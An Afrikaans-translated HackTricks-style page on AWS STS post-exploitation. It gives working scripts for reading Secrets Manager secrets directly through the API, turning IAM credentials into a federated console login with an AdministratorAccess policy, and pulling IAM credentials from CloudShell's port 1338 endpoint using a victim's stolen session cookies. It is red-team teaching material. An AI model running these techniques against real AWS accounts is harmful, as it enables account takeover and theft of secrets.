# AWS - STS Post Exploitation

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## STS

Vir meer inligting:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### Nuwe Metode Desember 2024: Oorbrug Vereiste vir Web Konsolskakel, Deur HTTPS POST Versoek Direk Verkry Geheimen van SecretsManager API (Geen Inlogskakel of Web Konsol)

Gister ingedien, as PR vir komende eksamen (ARTE: ex16x41) egter ek sien dat die PR nie vertoon nie, dalk verkeerd ingedien, kom ons probeer weer:
Met hierdie metode omseil jy heeltemal die vereiste om enige URL's te open, enige inlogskakels te formateer of selfs die CLI / Web Konsol te gebruik.
So wat het ons hier gedoen?
Ek het hierdie skrip geskryf wat direk met die AWS Secrets Manager API kommunikeer, dit is absoluut eenvoudig en reguit.
Wanneer jy die skrip uitvoer, stuur dit 'n HTTPS POST versoek na die AWS Secrets Manager eindpunt
https://secretsmanager.<region>.amazonaws.com/
Die GetSecretValue versoek word as deel van die POST versoek gestuur, geverifieer met SigV4 ondertekening (bestuur deur boto3).
Secrets Manager Verwerk die Versoek:
AWS valideer die versoek teen die IAM beleid wat aan jou gebruiker of rol geheg is (soos ons weet kan ons die geheime waarde slegs as web konsol sien)
As toegelaat, keer die Secrets Manager diens die aangevraagde geheime waarde in die antwoord terug.
**POC Demo:**
Die CLI AWS opdrag om geheime waarde te verkry werk nie omdat toegang geweier is ->
Echter, in die beeld kan jy die eenvoud van die metode sien om eenvoudig die vlag direk te onttrek deur die geheime ID te ken (dit ons enum in 'n vroe√´re fase toe ons ingelog was met gebruiker profiel)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Let wel: Ek dink hierdie metode kan universeel gebruik word afhangende van die scenario as die beleid toelaat (maar omseil beperkings van beleid wat nie via CLI toelaat nie)
So dit kan enige tyd gebruik word wanneer 'n beleid toelaat (as 'n alternatiewe toetsopsie)
Syd Nota: nuuskierig oor ander tegnieke wat jy kan toepas met dieselfde metode van direkte interaksie met die API van diens en nou AWS CLI, vir enige proses van priv esc of post exploitation soos hier.
**Kode:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Stel 'n pasgemaakte User-Agent in
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Verkry die geheime waarde direk via secretsmanager API
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Van IAM Krediete na Konsol

As jy daarin geslaag het om 'n paar IAM krediete te verkry, mag jy belangstel om **die web konsol te benader** met behulp van die volgende gereedskap.\
Let daarop dat die gebruiker/rol die toestemming **`sts:GetFederationToken`** moet h√™.

#### Pasgemaakte skrip

Die volgende skrip sal die standaard profiel en 'n standaard AWS ligging (nie gov en nie cn) gebruik om vir jou 'n onderteken URL te gee wat jy kan gebruik om binne die web konsol in te log:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Jy kan **'n webkonsole skakel genereer** met [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Verseker dat die IAM-gebruiker `sts:GetFederationToken` toestemming het, of verskaf 'n rol om aan te neem.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) is 'n hulpmiddel om AWS-akkrediteerings veilig te stoor en toegang daartoe te verkry in 'n ontwikkelingsomgewing.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
Jy kan ook **aws-vault** gebruik om 'n **blaaier konsolesessie** te verkry.
{% endhint %}

#### Van Konsol na IAM Krediete

[**Oorspronklik ontdek in hierdie pos**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), As jy daarin slaag om toegang tot 'n webkonsol te kompromitteer (miskien het jy koekies gesteel en kon nie toegang tot die .aws-gids kry nie), kan jy 'n paar IAM-tokenkrediete vir daardie gebruiker verkry deur middel van **CloudShell**.

CloudShell stel IAM-krediete bloot via 'n **on gedokumenteerde eindpunt op poort 1338**. Nadat jy sessiekoekies van die slagoffer in jou blaaier gelaai het, kan jy na CloudShell navigeer en die volgende opdragte gee om IAM-krediete te verkry.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
